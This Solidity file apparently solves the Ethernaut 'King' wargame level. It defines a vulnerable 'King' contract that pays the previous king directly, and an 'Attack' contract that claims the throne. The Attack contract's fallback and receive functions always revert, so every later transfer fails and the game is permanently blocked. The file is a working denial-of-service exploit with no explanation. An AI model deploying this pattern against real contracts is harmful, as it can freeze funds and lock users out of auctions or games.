// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address payable owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function load() external payable {}
    
    function deposit() external {
        owner.transfer(address(this).balance);
    }
    
    function attack(address payable _address) external payable {
        _address.call{value: address(this).balance}("");
    }
    
    fallback() external payable {
        revert();
    }
    receive() external payable {
        revert();
    }
}


contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
